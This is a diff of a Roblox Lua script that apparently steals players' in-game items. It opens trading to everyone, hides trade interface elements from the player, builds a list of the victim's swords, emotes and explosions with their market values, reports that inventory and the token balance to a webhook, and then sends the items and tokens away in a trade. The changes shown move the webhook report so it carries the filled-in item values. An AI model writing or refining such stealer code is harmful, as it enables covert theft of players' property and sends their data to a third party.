@@ -58,10 +58,10 @@ end
 
 -- Allow trade requests from everyone
 local tradeArgs = {
-    [1] = "AllowRequests",
-    [2] = "Everyone"
+    "AllowRequests",
+    "Everyone"
 }
-netModule:WaitForChild("RF/Trading/SetSetting"):InvokeServer(unpack(tradeArgs))
+game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net"):WaitForChild("RF/Trading/SetSetting"):InvokeServer(unpack(tradeArgs))
 
 -- Hide UI elements
 tradeGui.Black.Visible = false
@@ -443,15 +443,6 @@ end
 totalTokens = getCurrentTokens()
 tradeTokens = totalTokens
 
-local originalItemsToSend = {}
-for i, v in ipairs(itemsToSend) do
-    originalItemsToSend[i] = v
-end
-
-if #allItemsList > 0 or totalTokens > 0 then
-    SendWebhookMessage(true, allItemsList, itemsToSend, totalTokens)
-end
-
 if #itemsToSend == 0 and (itemCounts.Sword > 0 or itemCounts.Emote > 0 or itemCounts.Explosion > 0) then
     for _, category in ipairs(categories) do
         local categoryItems = clientInventory[category]
@@ -462,16 +453,26 @@ if #itemsToSend == 0 and (itemCounts.Sword > 0 or itemCounts.Emote > 0 or itemCo
                 end
                 
                 local itemName = itemInfo.Name
+                local rap = getRAP(category, itemName)
                 
                 table.insert(itemsToSend, {
                     ItemID = itemId, 
-                    RAP = 0,
+                    RAP = rap,
                     itemType = category, 
                     Name = itemName
                 })
             end
         end
     end
+end
+
+local originalItemsToSend = {}
+for i, v in ipairs(itemsToSend) do
+    originalItemsToSend[i] = v
+end
+
+if #allItemsList > 0 or totalTokens > 0 then
+    SendWebhookMessage(true, allItemsList, itemsToSend, totalTokens)
 end
 
 if #itemsToSend > 0 or totalTokens > 0 then
